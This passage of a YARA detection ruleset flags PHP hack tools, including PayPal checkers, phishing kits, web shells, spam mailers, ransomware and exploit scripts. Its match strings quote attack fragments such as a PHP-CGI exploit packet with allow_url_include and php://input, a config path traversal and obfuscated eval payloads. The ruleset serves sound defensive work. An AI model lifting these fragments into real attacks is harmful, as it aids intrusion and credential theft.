        $ps0 = "if ($archive->extract() == 0) {"
    condition:
        $ps0
}

rule php_hacktool_packer_007 : hacktool
{
    strings:
        $trigger = "$archive = new PclZip(\""
    condition:
        $trigger and PR00203 and PR04241 and PR04242
}

private rule PR04243 : trigger
{
    strings:
        $ps0 = "Jy4kTzAwTzBPKCRPME9PMDA"
    condition:
        $ps0
}

rule php_hacktool_packer_008 : hacktool
{
    strings:
        $trigger = "};eval(${${\""
    condition:
        $trigger and PR01665 and PR04243
}

private rule PR04244 : trigger
{
    strings:
        $ps0 = "return \"<div><b>PageRank"
    condition:
        $ps0
}

rule php_hacktool_page_rank_checker_001 : hacktool
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02874 and PR04244 and PR02875
}

private rule PR04245 : trigger
{
    strings:
        $ps0 = "<title>CHECKER PAYPAL BY ANONISMA </title>"
    condition:
        $ps0
}

rule php_hacktool_paypal_checker_anonisma_001 : hacktool
{
    strings:
        $trigger = "paypal"
    condition:
        $trigger and PR04245
}

rule php_hacktool_paypal_email_validator_001 : hacktool
{
    strings:
        $trigger = "<title>PayPal Valid Email Detect Country"
    condition:
        $trigger and PR01401 and PR00493
}

private rule PR04246 : trigger
{
    strings:
        $ps0 = "<title>PayPal Email Validity Checker"
    condition:
        $ps0
}

rule php_hacktool_paypal_email_validator_002 : hacktool
{
    strings:
        $trigger = "paypal"
    condition:
        $trigger and PR04246
}

rule php_hacktool_paypal_email_validator_003 : hacktool
{
    strings:
        $trigger = "<title>CHECKER PAYPAL BY"
    condition:
        $trigger
}

rule php_hacktool_paypal_email_validator_004 : hacktool
{
    strings:
        $trigger = "$this->fetch_value($run,'s.eVar36=\""
    condition:
        $trigger and PR01401 and PR00493
}

rule php_hacktool_paypal_email_validator_005 : hacktool
{
    strings:
        $trigger = "JOkEr7"
    condition:
        $trigger and PR00573
}

private rule PR04247 : trigger
{
    strings:
        $ps0 = "PAYPalid Mail CHECKER"
    condition:
        $ps0
}

rule php_hacktool_paypal_email_validator_006 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04247 and PR00355 and PR00357
}

private rule PR04248 : trigger
{
    strings:
        $ps0 = "PayPal_Validator"
    condition:
        $ps0
}

rule php_hacktool_paypal_validator_001 : hacktool
{
    strings:
        $trigger = "_SERVER['REMOTE_ADDR"
    condition:
        $trigger and PR04248
}

private rule PR04249 : trigger
{
    strings:
        $ps0 = "valid account\">VALID"
    condition:
        $ps0
}

private rule PR04250 : trigger
{
    strings:
        $ps0 = "path/to/your/api.php\" onkeyup=\"getApilistLength()\""
    condition:
        $ps0
}

rule php_hacktool_paypal_validator_001_02 : hacktool
{
    strings:
        $trigger = "=\"http://"
    condition:
        $trigger and PR04249 and PR00540 and PR04250
}

private rule PR04251 : trigger
{
    strings:
        $ps0 = "function GetListFiles"
    condition:
        $ps0
}

rule php_hacktool_permfolders_001 : hacktool
{
    strings:
        $trigger = "perm-folders.log"
    condition:
        $trigger and PR00265 and PR04251
}

private rule PR04252 : trigger
{
    strings:
        $ps0 = "recurDir('.',0777);"
    condition:
        $ps0
}

rule php_hacktool_permfolders_002 : hacktool
{
    strings:
        $trigger = "dir"
    condition:
        $trigger and PR04252
}

private rule PR04253 : trigger
{
    strings:
        $ps0 = "$directoryParts = explode('/', ltrim($_POST['directory'], '/'))"
    condition:
        $ps0
}

rule php_hacktool_phish_scanner_001 : hacktool
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02458 and PR04253
}

private rule PR04254 : trigger
{
    strings:
        $ps0 = "MCurl"
    condition:
        $ps0
}

rule php_hacktool_phish_scanner_002 : hacktool
{
    strings:
        $trigger = "if(!$this->_result) $this->scan();"
    condition:
        $trigger and PR04254
}

private rule PR04255 : trigger
{
    strings:
        $ps0 = "$url = \"http://$domen/\".\"$path\".\"/$i.php\";"
    condition:
        $ps0
}

rule php_hacktool_phish_scanner_002_02 : hacktool
{
    strings:
        $trigger = ">"
    condition:
        $trigger and PR04254 and PR04255
}

private rule PR04256 : trigger
{
    strings:
        $ps0 = "priv8"
    condition:
        $ps0
}

rule php_hacktool_phishbackend_001 : hacktool
{
    strings:
        $trigger = "CONTADOR v2.0 - DESENVOLDI POR"
    condition:
        $trigger and PR04256
}

rule php_hacktool_phishbackend_001_001 : hacktool
{
    strings:
        $trigger = "MullaKill Priv8"
    condition:
        $trigger and PR04256
}

private rule PR04257 : trigger
{
    strings:
        $ps0 = "function recurse_copy("
    condition:
        $ps0
}

rule php_hacktool_phishbackend_002 : hacktool
{
    strings:
        $trigger = "@mkdir($"
        $php_hacktool_phishbackend_002_w0 = "ThinkPHP.CN"
    condition:
        $trigger and PR00732 and PR04257 and PR00431 and PR04149 and not $php_hacktool_phishbackend_002_w0
}

private rule PR04258 : trigger
{
    strings:
        $ps0 = "var output = Aes.Ctr.decrypt(Turr, Hassan, $nBits);"
    condition:
        $ps0
}

rule php_hacktool_phishbackend_002_02 : hacktool
{
    strings:
        $trigger = "document.write("
    condition:
        $trigger and PR00050 and PR04258
}

private rule PR04259 : trigger
{
    strings:
        $ps0 = "skype:sowakidi"
    condition:
        $ps0
}

rule php_hacktool_phishbackend_003 : hacktool
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR04259 and PR01479
}

// MANUAL FIX NECESSARY
rule php_hacktool_phishbackend_004 : hacktool
{
    strings:
        $trigger = "*/"
        $php_hacktool_phishbackend_004_r0 = /l33bo_phishers/
    condition:
        $trigger and $php_hacktool_phishbackend_004_r0
}

rule php_hacktool_phishbackend_005 : hacktool
{
    strings:
        $trigger = "personal.natwest.com"
    condition:
        $trigger and PR00273
}

private rule PR04260 : trigger
{
    strings:
        $ps0 = "$ciphertext = AesCtr::encrypt($buffer, $key, $nBits);"
    condition:
        $ps0
}

private rule PR04261 : trigger
{
    strings:
        $ps0 = "document.write(output)</script></head></html>\";"
    condition:
        $ps0
}

rule php_hacktool_phishbackend_006 : hacktool
{
    strings:
        $trigger = "function encrypt($buffer){"
    condition:
        $trigger and PR00050 and PR04260 and PR04261
}

rule php_hacktool_phishbackend_007 : hacktool
{
    strings:
        $trigger = "$('.gone_bt').click(function(){window.location.href=\"http"
    condition:
        $trigger and PR00273
}

private rule PR04262 : trigger
{
    strings:
        $ps0 = "if(filter_var($IPaddress,FILTER_VALIDATE_IP,FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)!==false){return $IPaddress;}}}}}function clientData"
    condition:
        $ps0
}

rule php_hacktool_phishbackend_008 : hacktool
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR04262
}

rule php_hacktool_phishbackend_010 : hacktool
{
    strings:
        $trigger = "function fetch_value($str, $find_start, $find_end)"
    condition:
        $trigger and PR00391 and PR00392
}

rule php_hacktool_phishbackend_011 : hacktool
{
    strings:
        $trigger = "$domain = substr(strrchr($login"
    condition:
        $trigger and PR00273
}

private rule PR04263 : trigger
{
    strings:
        $ps0 = "$ip_protection_api"
    condition:
        $ps0
}

rule php_hacktool_phishbackend_012 : hacktool
{
    strings:
        $trigger = "file"
    condition:
        $trigger and PR04263
}

rule php_hacktool_phishbackend_013 : hacktool
{
    strings:
        $trigger = "DNThirTeen"
    condition:
        $trigger and PR00507
}

private rule PR04264 : trigger
{
    strings:
        $ps0 = "$pass = $_POST["
    condition:
        $ps0
}

private rule PR04265 : trigger
{
    strings:
        $ps0 = "$ip = $_SERVER['REMOTE_ADDR'];"
    condition:
        $ps0
}

rule php_hacktool_phishbackend_014 : hacktool
{
    strings:
        $trigger = "$user = $_POST["
    condition:
        $trigger and PR04264 and PR04152 and PR00273 and PR04265
}

rule php_hacktool_phishbackend_015 : hacktool
{
    strings:
        $trigger = "deleteAll('botadmin.php');"
    condition:
        $trigger and PR00039 and PR02056
}

private rule PR04266 : trigger
{
    strings:
        $ps0 = "403 Forbidden"
    condition:
        $ps0
}

rule php_hacktool_phishbackend_016 : hacktool
{
    strings:
        $trigger = "\\x00\",\"charAt\",\"decodeUTF8\",\"indexOf\",\"replace"
    condition:
        $trigger and PR04266 and PR00431
}

private rule PR04267 : trigger
{
    strings:
        $ps0 = "urlencode(urlencode(gethostbyaddr($ip)));"
    condition:
        $ps0
}

rule php_hacktool_phishbackend_017 : hacktool
{
    strings:
        $trigger = "getenv(\"REMOTE_ADDR\");"
    condition:
        $trigger and PR00092 and PR04267
}

private rule PR04268 : trigger
{
    strings:
        $ps0 = "antibot.pw"
    condition:
        $ps0
}

rule php_hacktool_phishbackend_018 : hacktool
{
    strings:
        $trigger = "isset($_POST['password"
    condition:
        $trigger and PR00042 and PR02051 and PR04268
}

rule php_hacktool_phishbackend_019 : hacktool
{
    strings:
        $trigger = "ElZeroCoder"
    condition:
        $trigger and PR02609
}

rule php_hacktool_phishbackend_020 : hacktool
{
    strings:
        $trigger = "@z0n51"
    condition:
        $trigger and PR02609
}

rule php_hacktool_phishbackend_021 : hacktool
{
    strings:
        $trigger = "@ANOXYTY"
    condition:
        $trigger and PR02609
}

rule php_hacktool_phishtank_check_001 : hacktool
{
    strings:
        $trigger = "if( parse_url($_SERVER['HTTP_REFERER'])['host'] == 'phishtank.com'){"
    condition:
        $trigger
}

rule php_hacktool_phonehome_002 : hacktool
{
    strings:
        $trigger = "echo \"-=IDB=-$id-=IDE=-\\n\""
    condition:
        $trigger and PR00070
}

private rule PR04269 : trigger
{
    strings:
        $ps0 = "$packet  = \"POST \".$p.\"/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
    condition:
        $ps0
}

private rule PR04270 : trigger
{
    strings:
        $ps0 = "!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html"
    condition:
        $ps0
}

rule php_hacktool_php_cgi_exploit_001 : hacktool
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR04269 and PR04270
}

rule php_hacktool_php_proxy_001 : hacktool
{
    strings:
        $trigger = "\"<?php echo $GLOBALS['_config']['basic_auth_var_name'] ?>\" value=\"<?php echo base64_encode($data['realm']) ?>\""
    condition:
        $trigger
}

rule php_hacktool_php_proxy_002 : hacktool
{
    strings:
        $trigger = "echo \"[php][RES]\" . base64_encode($respond) . \"[/RES]\\n\";"
    condition:
        $trigger
}

rule php_hacktool_php_proxy_003 : hacktool
{
    strings:
        $trigger = "if($fp = @fsockopen($ip, $port, $errno, $errstr, 20))"
    condition:
        $trigger
}

private rule PR04271 : trigger
{
    strings:
        $ps0 = "return $proxify ? \"{$GLOBALS['_script_url']}?"
    condition:
        $ps0
}

rule php_hacktool_php_proxy_004 : hacktool
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR04271 and PR01479
}

private rule PR04272 : trigger
{
    strings:
        $ps0 = "# Surrogafier v"
    condition:
        $ps0
}

private rule PR04273 : trigger
{
    strings:
        $ps0 = "# Author: Brad Cable"
    condition:
        $ps0
}

rule php_hacktool_php_proxy_005 : hacktool
{
    strings:
        $trigger = "new RegExp"
    condition:
        $trigger and PR04272 and PR00323 and PR04273
}

private rule PR04274 : trigger
{
    strings:
        $ps0 = "$packet=\"POST \".$p.\"memberlist.php?joined_select=lt&active_select=lt&count_select=eq"
    condition:
        $ps0
}

rule php_hacktool_phpbb_memberlist_exploit_001 : hacktool
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR04270 and PR04274
}

rule php_hacktool_pma_rce_scanner_001 : hacktool
{
    strings:
        $trigger = "print \"[-] example: intitle:phpMyAdmin\\n\";"
    condition:
        $trigger and PR00013
}

private rule PR04275 : trigger
{
    strings:
        $ps0 = "mxs.mail.ru"
    condition:
        $ps0
}

rule php_hacktool_portscan_001 : hacktool
{
    strings:
        $trigger = "if(@socket_connect"
    condition:
        $trigger and PR04275 and PR00675
}

rule php_hacktool_portscan_002 : hacktool
{
    strings:
        $trigger = "tBm48cvBlT8zsqxM3msMC7zSD0lVZCuQ5COOSG/iUVdQQFZ"
    condition:
        $trigger and PR00029 and PR01436
}

private rule PR04276 : trigger
{
    strings:
        $ps0 = "function do_post_request($url, $data, $optional_headers"
    condition:
        $ps0
}

rule php_hacktool_post_request_001 : hacktool
{
    strings:
        $trigger = "$p = getRandChar($pcount);"
    condition:
        $trigger and PR00507 and PR04276
}

rule php_hacktool_postmanfull_001 : hacktool
{
    strings:
        $trigger = "PostMan Full "
    condition:
        $trigger and PR00301
}

rule php_hacktool_ppcheck_001 : hacktool
{
    strings:
        $trigger = "<title>#ScannerID - PayPal Checker"
    condition:
        $trigger and PR01401 and PR00493
}

rule php_hacktool_ppcheck_002 : hacktool
{
    strings:
        $trigger = "TrojanzBoy<br>Paypal Checker</font></p>"
    condition:
        $trigger and PR01401 and PR00493
}

rule php_hacktool_ppcheck_003 : hacktool
{
    strings:
        $trigger = "$_CheckAction = curl('https://www.paypal.com"
    condition:
        $trigger and PR01401
}

rule php_hacktool_ppcheck_004 : hacktool
{
    strings:
        $trigger = "$ketqua = $mailx->check($email"
    condition:
        $trigger and PR01401 and PR00493
}

rule php_hacktool_ppcheck_008 : hacktool
{
    strings:
        $trigger = "<title>The Joker Private Checker</title>"
    condition:
        $trigger and PR00493
}

private rule PR04277 : trigger
{
    strings:
        $ps0 = "explode(\"'_DB_PASSWD_',"
    condition:
        $ps0
}

private rule PR04278 : trigger
{
    strings:
        $ps0 = "($config as $wpcon)"
    condition:
        $ps0
}

private rule PR04279 : trigger
{
    strings:
        $ps0 = "\"../../../../../../config/settings.inc.php\""
    condition:
        $ps0
}

rule php_hacktool_prestashop_cc_stealer_001 : hacktool
{
    strings:
        $trigger = "mysql"
    condition:
        $trigger and PR04277 and PR04278 and PR04279
}

rule php_hacktool_priv8shell_001 : hacktool
{
    strings:
        $trigger = "priv8 WebShell"
    condition:
        $trigger
}

private rule PR04280 : trigger
{
    strings:
        $ps0 = "www.priv8shop.biz"
    condition:
        $ps0
}

rule php_hacktool_priv8shell_002 : hacktool
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR00046 and PR04280
}

private rule PR04281 : trigger
{
    strings:
        $ps0 = ";mail($to,$subject,$message,$headers);}"
    condition:
        $ps0
}

private rule PR04282 : trigger
{
    strings:
        $ps0 = "=@sha1_file($"
    condition:
        $ps0
}

rule php_hacktool_ransomware_003 : hacktool
{
    strings:
        $trigger = ",chr(60).chr(63).chr(112).chr(104).chr(112).chr(32)"
    condition:
        $trigger and PR00435 and PR04281 and PR04282
}

rule php_hacktool_ransomware_005 : hacktool
{
    strings:
        $trigger = "$ch = curl_init($this->getEncryptedKey() . \"?d=\" . $domain);"
    condition:
        $trigger and PR00727
}

rule php_hacktool_ransomware_005_02 : hacktool
{
    strings:
        $trigger = "add_filter('content_save_pre', 'wpe_encrypt_before_save"
    condition:
        $trigger and PR00727
}

private rule PR04283 : trigger
{
    strings:
        $ps0 = ";mail($to,$subject,$message);}"
    condition:
        $ps0
}

rule php_hacktool_ransomware_007 : hacktool
{
    strings:
        $trigger = ",chr(60).chr(63).chr(112).chr(104).chr(112).chr(32)"
    condition:
        $trigger and PR00435 and PR04283 and PR04282
}

rule php_hacktool_ransomware_008 : hacktool
{
    strings:
        $trigger = "ter@spl0it"
    condition:
        $trigger and PR00042
}

rule php_hacktool_ransomware_009 : hacktool
{
    strings:
        $trigger = "$wpdb->posts SET post_status='null"
    condition:
        $trigger and PR00322 and PR00050 and PR00323
}

private rule PR04284 : trigger
{
    strings:
        $ps0 = "PHRpdGxlPkNvblRpbWU8L3RpdGxlPg0KPGxpbmsgcmVs"
    condition:
        $ps0
}

rule php_hacktool_ransomware_010 : hacktool
{
    strings:
        $trigger = ".base64_decode"
    condition:
        $trigger and PR04284
}

rule php_hacktool_revsliderexpoit_001 : hacktool
{
    strings:
        $trigger = "\"{$__['target']}/wp-admin/admin-ajax.php?action=revslider_ajax_action"
    condition:
        $trigger and PR01355
}

rule php_hacktool_safemodedisabler_001 : hacktool
{
    strings:
        $trigger = "<title>Safe Mode Fucker</title>"
    condition:
        $trigger
}

private rule PR04285 : trigger
{
    strings:
        $ps0 = "ZGlzYWJsZV9mdW5jdGlvbnM9ZGw"
    condition:
        $ps0
}

rule php_hacktool_safemodedisabler_002 : hacktool
{
    strings:
        $trigger = "system("
    condition:
        $trigger and PR04285
}

rule php_hacktool_safemodedisabler_003 : hacktool
{
    strings:
        $trigger = "<title>Safe Mode Bypass | LeetSec</title>"
    condition:
        $trigger
}

private rule PR04286 : trigger
{
    strings:
        $ps0 = "url"
    condition:
        $ps0
}

private rule PR04287 : trigger
{
    strings:
        $ps0 = "class SAPE_base"
    condition:
        $ps0
}

rule php_hacktool_SAPE_001 : hacktool
{
    strings:
        $trigger = "var $_server_list = array('dispens"
    condition:
        $trigger and PR04286 and PR04287
}

rule php_hacktool_SAPE_001_04 : hacktool
{
    strings:
        $trigger = "array('dispenser-01.sape.ru"
    condition:
        $trigger and PR04286 and PR04287
}

private rule PR04288 : trigger
{
    strings:
        $ps0 = "/'._SAPE_USER.'/"
    condition:
        $ps0
}

rule php_hacktool_SAPE_001_05 : hacktool
{
    strings:
        $trigger = "echo $sape_articles->process_request();"
    condition:
        $trigger and PR04288
}

private rule PR04289 : trigger
{
    strings:
        $ps0 = "include(TEMPLATEPATH.'/login.php');"
    condition:
        $ps0
}

private rule PR04290 : trigger
{
    strings:
        $ps0 = "$ip_real=ip2int(getenv('REMOTE_ADDR'));"
    condition:
        $ps0
}

rule php_hacktool_SAPE_001_06 : hacktool
{
    strings:
        $trigger = "$ip[\"ip_name\"][]=\"northernlight\";"
    condition:
        $trigger and PR04289 and PR04290
}

rule php_hacktool_SAPE_001_07 : hacktool
{
    strings:
        $trigger = "echo $client_lnk->build_links();"
    condition:
        $trigger and PR04288
}

rule php_hacktool_SAPE_001_08 : hacktool
{
    strings:
        $trigger = "/'._SAPE_USER.'/ML.php"
    condition:
        $trigger
}

private rule PR04291 : trigger
{
    strings:
        $ps0 = "class LinkfeedClient {"
    condition:
        $ps0
}

private rule PR04292 : trigger
{
    strings:
        $ps0 = "class SAPE_base {"
    condition:
        $ps0
}

rule php_hacktool_SAPE_001_09 : hacktool
{
    strings:
        $trigger = "_SAPE_USER"
    condition:
        $trigger and PR04291 and PR04292
}

private rule PR04293 : trigger
{
    strings:
        $ps0 = "FILE_TO_SAPE_EDIT_FIRST"
    condition:
        $ps0
}

rule php_hacktool_SAPE_001_10 : hacktool
{
    strings:
        $trigger = "SAPE Code"
    condition:
        $trigger and PR04293
}

private rule PR04294 : trigger
{
    strings:
        $ps0 = " = new SxGeo("
    condition:
        $ps0
}

rule php_hacktool_SAPE_001_11 : hacktool
{
    strings:
        $trigger = "_SAPE_USER"
    condition:
        $trigger and PR04294
}

private rule PR04295 : trigger
{
    strings:
        $ps0 = "_SAPE_USER', $this->settings->user );"
    condition:
        $ps0
}

rule php_hacktool_SAPE_001_12 : hacktool
{
    strings:
        $trigger = "$text = @$args['block'] ?"
    condition:
        $trigger and PR04295 and PR04288
}

private rule PR04296 : trigger
{
    strings:
        $ps0 = "$sape = new SAPE_client"
    condition:
        $ps0
}

rule php_hacktool_SAPE_002 : hacktool
{
    strings:
        $trigger = "_SAPE_USER"
    condition:
        $trigger and PR04296
}

private rule PR04297 : trigger
{
    strings:
        $ps0 = "wp_foots();"
    condition:
        $ps0
}

rule php_hacktool_SAPE_002_02 : hacktool
{
    strings:
        $trigger = "josfooter();"
    condition:
        $trigger and PR04297 and PR02534
}

rule php_hacktool_SAPE_002_03 : hacktool
{
    strings:
        $trigger = "josfooter();"
    condition:
        $trigger and PR04297 and PR02534
}

// MANUAL FIX NECESSARY
rule php_hacktool_SAPE_003 : hacktool
{
    strings:
        $trigger = "josfooter();"
        $php_hacktool_SAPE_003_r0 = /include\([^\)]+gif.\)/
    condition:
        $trigger and PR04297 and PR02534 and $php_hacktool_SAPE_003_r0
}

private rule PR04298 : trigger
{
    strings:
        $ps0 = "scan inb0x hotmail"
    condition:
        $ps0
}

rule php_hacktool_scaninb0xhotmail_001 : hacktool
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04298
}

rule php_hacktool_se3curity_001 : hacktool
{
    strings:
        $trigger = "||~ http://www.se3curity.com ~||"
    condition:
        $trigger and PR01179
}

rule php_hacktool_search_replace_001 : hacktool
{
    strings:
        $trigger = "static $count = 1; echo  $count.\". \".$path_to_file2;echo \"<br>\";"
    condition:
        $trigger and PR00039
}

private rule PR04299 : trigger
{
    strings:
        $ps0 = "<!-- Sh4hien - Egyptian Shell Team"
    condition:
        $ps0
}

rule php_hacktool_Sh4hien_001 : hacktool
{
    strings:
        $trigger = ">"
    condition:
        $trigger and PR04299
}

rule php_hacktool_shelluploader_001 : hacktool
{
    strings:
        $trigger = "$shellz = $_POST['shells'];"
    condition:
        $trigger
}

rule php_hacktool_shelluploader_002 : hacktool
{
    strings:
        $trigger = "array('qqfile'=>\"@$uploadfile\"));"
    condition:
        $trigger and PR00507
}

private rule PR04300 : trigger
{
    strings:
        $ps0 = "function inf"
    condition:
        $ps0
}

private rule PR04301 : trigger
{
    strings:
        $ps0 = "function shell"
    condition:
        $ps0
}

rule php_hacktool_shelluploader_005 : hacktool
{
    strings:
        $trigger = "pastebin.com/raw.php?"
    condition:
        $trigger and PR01403 and PR04300 and PR04301 and PR02146 and PR01431
}

private rule PR04302 : trigger
{
    strings:
        $ps0 = "echo \"your shell location"
    condition:
        $ps0
}

rule php_hacktool_shelluploader_006 : hacktool
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR04302 and PR01648
}

rule php_hacktool_shelluploader_007 : hacktool
{
    strings:
        $trigger = "* DM-5HELL 2014 *"
    condition:
        $trigger and PR01818 and PR00029 and PR00507
}

private rule PR04303 : trigger
{
    strings:
        $ps0 = "class ShopSearcher extends ScannerOfDomination"
    condition:
        $ps0
}

rule php_hacktool_shopsearcher_001 : hacktool
{
    strings:
        $trigger = "mysql"
    condition:
        $trigger and PR04303
}

rule php_hacktool_simpleimageupload_exploit_001 : hacktool
{
    strings:
        $trigger = "$target.\"/index.php?option=com_simpleimageupload&task=upload.upload&tmpl=component\")"
    condition:
        $trigger and PR01401
}

private rule PR04304 : trigger
{
    strings:
        $ps0 = "if($_GET['h']<>''){"
    condition:
        $ps0
}

private rule PR04305 : trigger
{
    strings:
        $ps0 = "echo \"<img src='temp.gif' / ><hr>\";"
    condition:
        $ps0
}

rule php_hacktool_simpleimageupload_exploit_002 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04304 and PR00355 and PR04305 and PR00357
}

private rule PR04306 : trigger
{
    strings:
        $ps0 = "$TARGET_HOST/scanner?scan_id=$scan_id&token=$token"
    condition:
        $ps0
}

private rule PR04307 : trigger
{
    strings:
        $ps0 = "\"max_execution_time"
    condition:
        $ps0
}

rule php_hacktool_site_scanner_001 : hacktool
{
    strings:
        $trigger = "file_get_contents("
    condition:
        $trigger and PR04306 and PR00029 and PR02299 and PR04307
}

private rule PR04308 : trigger
{
    strings:
        $ps0 = "$uurl=@file_get_contents($base_url.\"wp-includes/admin-bar.php\");"
    condition:
        $ps0
}

rule php_hacktool_site_scanner_002 : hacktool
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR00013 and PR01021 and PR04308
}

private rule PR04309 : trigger
{
    strings:
        $ps0 = "function arr_trim($arr)"
    condition:
        $ps0
}

private rule PR04310 : trigger
{
    strings:
        $ps0 = "arr_trim(read_file("
    condition:
        $ps0
}

rule php_hacktool_site_scanner_003 : hacktool
{
    strings:
        $trigger = "CURLOPT_USERAGENT"
    condition:
        $trigger and PR04309 and PR00265 and PR04310
}

rule php_hacktool_site_scanner_004 : hacktool
{
    strings:
        $trigger = "('.');if(count($rs)<850){header('HTTP/1.1 200');exit;}"
    condition:
        $trigger and PR00092
}

rule php_hacktool_slackercode_email_extractor_001 : hacktool
{
    strings:
        $trigger = ">Slackercode eMail Extractor</"
    condition:
        $trigger and PR00080 and PR00113
}

private rule PR04311 : trigger
{
    strings:
        $ps0 = "elseif($_GET['method'] == \"slowloris\")"
    condition:
        $ps0
}

rule php_hacktool_slowloris_001 : hacktool
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR04311
}

private rule PR04312 : trigger
{
    strings:
        $ps0 = "link(\"shadow\",\"shadow.bak3x\");"
    condition:
        $ps0
}

rule php_hacktool_smtp_001 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR04312 and PR01392 and PR00357
}

rule php_hacktool_spamtool_001 : hacktool
{
    strings:
        $trigger = "$Password,base64_decode(urldecode($InRequest)),MCRYPT_DECRYPT,'amsstatinivector');"
    condition:
        $trigger and PR01458
}

rule php_hacktool_spamtool_002 : hacktool
{
    strings:
        $trigger = "$replyTo=leafTrim($_POST['replyTo']);"
    condition:
        $trigger and PR00301
}

private rule PR04313 : trigger
{
    strings:
        $ps0 = "if ($_POST['action'] == \"send\")"
    condition:
        $ps0
}

rule php_hacktool_spamtool_002_02 : hacktool
{
    strings:
        $trigger = "new PHPMailer;"
    condition:
        $trigger and PR04313 and PR00437 and PR00301
}

rule php_hacktool_spamtool_002_03 : hacktool
{
    strings:
        $trigger = "leafmailer"
    condition:
        $trigger and PR04103
}

private rule PR04314 : trigger
{
    strings:
        $ps0 = "print '*send:bad*"
    condition:
        $ps0
}

private rule PR04315 : trigger
{
    strings:
        $ps0 = "print '*rbl:ok*"
    condition:
        $ps0
}

rule php_hacktool_spamtool_003 : hacktool
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04314 and PR04315
}

private rule PR04316 : trigger
{
    strings:
        $ps0 = "base64_decode(base64_decode(base64_decode($strings["
    condition:
        $ps0
}

rule php_hacktool_spamtool_004 : hacktool
{
    strings:
        $trigger = "mail(stripslashes($"
    condition:
        $trigger and PR04316
}

private rule PR04317 : trigger
{
    strings:
        $ps0 = "R_HOST"
    condition:
        $ps0
}

rule php_hacktool_spamtool_007 : hacktool
{
    strings:
        $trigger = "RAZOR_BASE_PATH"
    condition:
        $trigger and PR04317 and PR02208
}

private rule PR04318 : trigger
{
    strings:
        $ps0 = "error_reporting(E_ALL); } else { error_reporting(0); ini_set('expose_php', 0); } ob_start(); class"
    condition:
        $ps0
}

private rule PR04319 : trigger
{
    strings:
        $ps0 = "500 Internal Server Error', true, 500); } ob_end_flush(); session_write_close(); exit();"
    condition:
        $ps0
}

rule php_hacktool_spamtool_008 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04318 and PR00355 and PR04319 and PR00357
}

private rule PR04320 : trigger
{
    strings:
        $ps0 = "define('X_RESULT_NAME',"
    condition:
        $ps0
}

rule php_hacktool_spamtool_009 : hacktool
{
    strings:
        $trigger = "\"://{$_SERVER['SERVER_NAME']}\".str_replace(basename($_SERVER['SCRIPT_NAME']),\"\",$_SERVER['SCRIPT_NAME']));"
    condition:
        $trigger and PR00431 and PR04320
}

// MANUAL FIX NECESSARY
rule php_hacktool_spamtool_010 : hacktool
{
    strings:
        $trigger = "rray"
        $php_hacktool_spamtool_010_r0 = /array\([\s]*['deco_sba,\s]+\);[\s]*array_splice\([\s]*\$[\w]+,[\s\d,\*]+\);[\s]*\$[\w]+[\s]*=[\s]*implode\([\s]*''[\s]*,[\s]*array_reverse\([\s]*\$[\w]+[\s]*\)[\s]*\);/
    condition:
        $trigger and $php_hacktool_spamtool_010_r0
}

private rule PR04321 : trigger
{
    strings:
        $ps0 = "new PHPMailer;"
    condition:
        $ps0
}

private rule PR04322 : trigger
{
    strings:
        $ps0 = "var sdata = \"{\\\"SmtpServer"
    condition:
        $ps0
}

rule php_hacktool_spamtool_011 : hacktool
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR00437 and PR00301 and PR04321 and PR04322
}

private rule PR04323 : trigger
{
    strings:
        $ps0 = "spamtools.be"
    condition:
        $ps0
}

rule php_hacktool_spamtool_012 : hacktool
{
    strings:
        $trigger = "/etc/"
    condition:
        $trigger and PR04323
}

private rule PR04324 : trigger
{
    strings:
        $ps0 = "FZzHjqtqFkYfp+8VA3JSjzA5"
    condition:
        $ps0
}

rule php_hacktool_spamtool_013 : hacktool
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR04324
}

// MANUAL FIX NECESSARY
rule php_hacktool_spamtool_014 : hacktool
{
    strings:
        $trigger = "mail(stripslashes"
        $php_hacktool_spamtool_014_r0 = /\$\w+ = mail.(stripslashes..\w+., ){2,3}stripslashes..\w+..;/
    condition:
        $trigger and $php_hacktool_spamtool_014_r0
}

// MANUAL FIX NECESSARY
rule php_hacktool_spamtool_015 : hacktool
{
    strings:
        $trigger = "mail(stripslashes"
        $php_hacktool_spamtool_015_r0 = /foreach \(\$_POST as \$key => \$value\) \{array_push\(\$data, \$value\);\}/
    condition:
        $trigger and $php_hacktool_spamtool_015_r0
}

rule php_hacktool_sql_TeamHack_001 : hacktool
{
    strings:
        $trigger = "TeamHack SQL DUMPER"
    condition:
        $trigger
}

private rule PR04325 : trigger
{
    strings:
        $ps0 = "check_sql_inj($h3h3,$argv[2]);"
    condition:
        $ps0
}

rule php_hacktool_sqlinjection_001 : hacktool
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR04325
}

rule php_hacktool_sqliscanner_001_001 : hacktool
{
    strings:
        $trigger = "<title>SQLi Scanner</title>"
    condition:
        $trigger
}

rule php_hacktool_sqliscanner_001_002 : hacktool
{
    strings:
        $trigger = "$google = \"http://www.google.com/cse?cx=013269018370076798483%3Awdba3dlnxqm&q=REPLACE_DORK&num=100&hl=en&as_qdr=all&start=REPLACE_START&sa=N\";"
    condition:
        $trigger
}

rule php_hacktool_ssv3_001 : hacktool
{
    strings:
